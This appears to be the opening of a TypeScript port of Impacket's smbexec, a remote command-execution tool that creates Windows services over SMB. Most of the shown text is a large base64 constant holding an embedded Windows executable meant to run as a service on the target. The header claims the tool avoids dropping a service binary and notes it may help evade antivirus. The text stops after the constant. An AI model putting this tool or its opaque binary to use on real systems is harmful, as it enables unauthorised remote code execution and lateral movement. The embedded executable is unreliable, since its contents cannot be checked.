#!/usr/bin/env node
// Impacket - Collection of TypeScript classes for working with network protocols.
//
// Copyright Fortra, LLC and its affiliated companies
//
// All rights reserved.
//
// This software is provided under a slightly modified version
// of the Apache Software License. See the accompanying LICENSE file
// for more information.
//
// Description:
//   A similar approach to psexec w/o using RemComSvc. The technique is described here
//   https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access
//   Our implementation goes one step further, instantiating a local smbserver to receive the
//   output of the commands. This is useful in the situation where the target machine does NOT
//   have a writeable share available.
//   Keep in mind that, although this technique might help avoiding AVs, there are a lot of
//   event logs generated and you can't expect executing tasks that will last long since Windows
//   will kill the process since it's not responding as a Windows service.
//   Certainly not a stealthy way.
//
//   This port only supports SHARE mode. SERVER mode (local SMB server) is not ported.
//
// Author:
//   beto (@agsolino)
//   Ported to TypeScript
//
// Reference for:
//   DCE/RPC and SMB.
//

import { Buffer } from 'node:buffer';
import { createInterface, type Interface as ReadlineInterface } from 'node:readline';
import { parseArgs } from 'node:util';
import {
  parseTarget,
  init as initLogger,
  initProxy,
  info,
  error,
  critical,
  debug,
  normalizeArgs,
  loadKeytabKeys,
  BANNER,
} from '@impacket/examples';
import { SMBConnection } from '@impacket/smb-connection';
import {
  DCERPCTransportFactory,
  MSRPC_UUID_SCMR,
  hROpenSCManagerW,
  hROpenServiceW,
  hRCreateServiceW,
  hRStartServiceW,
  hRDeleteService,
  hRControlService,
  hRCloseServiceHandle,
  SERVICE_DEMAND_START,
  SERVICE_CONTROL_STOP,
  SERVICE_ALL_ACCESS,
  DCERPCException,
  type SMBTransport,
  type DCERPC_v5,
  type ScRpcHandle,
} from '@impacket/dcerpc';

function randomLetters(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < n; i++) {
    result += chars[Math.floor(Math.random() * chars.length)]!;
  }
  return result;
}

const SMBEXECSVC_EXE = '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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMV88fUp1sYUPRT+BGAAAAAGgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVcYNHYh9N1HQSKwAAAAAABgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAACAAIAAgACAAIAAgACAAIAAAACAAAAAgAAAAIAAAACAAAAAAAAAAIAAAAAAAAAAgA8PDw8PDw8PDw8PDw8PDw8AAQIDBAUGBwgJCgsMDQ4PAAAAAAAAAAAAAAAAAAAAgP9//3//f/9//3//f/9//38AgACAAIAAgACAAIAAgACAAHwAAAAAAAAAAAAAAAAAAP///3////9/////f////38AAACAAAAAgAAAAIAAAACAAACAfwAAgH8AAIB/AACAf/////////9//////////38AAAAAAAAAgAAAAAAAAACAAAAAAAAA8H8AAAAAAADwfwAAAAAAAAAAAAAAAAAAAID///////////////////9/AAAAAAAAAAAAAAAAAAD/fwAAgP8AAIB/AAAAXwAAAF8AAAAAAADgQwAAAF8AAID/AACAfwB8AHwAfAAAAAAAAAAAMEMAADBFAAAAAAAAAAAAAAAAAAAwQwAAAAAAADBFAAAAAAAAgF8AAIB/AAAAAAAAAIAAAACAAAAAgAAAAIAAAID/AACA/wAAgP8AAID//3//f/9//3//f/9//3//f////3////9/////f////3//f/9//3//f/9//3//f/9//////////3//////////f/////////9//////////3//f/9//3//f/9//3//f/9/////f////3////9/////f/////////9//////////3//f/9//3//f/9//3//f/9/////f////3////9/////fwAAwH8AAAAAAAAAAAAA+H////////////////////9/AAAAAAAAAAAAAAAAAID/fwAAwH8AAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACA/3//f/9//3//f/9//3//fwAAAIAAAACAAAAAgAAAAID///9/////f////3////9/AADAfwAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAD4fwAAAAAAAAAAAAAAAAAAAAAAAAAAAID/fwB+AAAAAMB/AAAAAAAA+H8AAAAAAAAAAAAAAAAAgP9/AADAfwAAAAAAAAAAAAD4fwAAwH8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgP9/AACAPwAAgD8AAAAAAADwPwAAAAAAAAAAAAAAAAAA/z//f/9//3//f/9//3//f/9/AIAAgACAAIAAgACAAIAAgAB8AHwAfAB8AHwAfAB8AHwAAIB/AAAAAAAAAAAAAAAA////f////3////9/////fwAAgH8AAIB/AACAfwAAgH////9/////fwAAAAAAAAAAAACAfwAAgH8AAAAAAAAAAAAAgD8AAIA/AAAAAAAAAAAAAACAAAAAgAAAAIAAAACAAACAPwAAgH8AAAAAAAAAAP////////9//////////38AAAAAAADwfwAAAAAAAPB/AAAAAAAA8D8AAAAAAADwPwAAAAAAAACAAAAAAAAAAIAAAAAAAADwfwAAgH8AAAAAAAAAAAAAAAAAAAAAAAD/PwAAAAAAAAAAAAAAAAAAAID///////////////////9/AAAAAAAAAAAAAAAAAAD/f/9//3//f/9//3//f/9//38AgACAAIAAgACAAIAAgACAAHwAAAAAgH8AAAAAAAAAAP///3////9/////f////38AAACAAAAAgAAAAIAAAACAAACAfwAAgH8AAIB/AACAf////3////9/AAAAAAAAAAAAAIB/AACAfwAAAAAAAAAAAACAPwAAgD8AAAAAAAAAAAAAgD8AAIB/AAAAAAAAAAD/////////f/////////9/AAAAAAAAAIAAAAAAAAAAgAAAAAAAAPB/AAAAAAAA8H8AAAAAAADwPwAAAAAAAPA/AAAAAAAA8D8AAAAAAADwfwAAgP8AAIB/AAAAAAAAAAD///////////////////9/AAAAAAAAAAAAAAAAAAD/PwAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAP9/p0Y7jIfNxj6y+26J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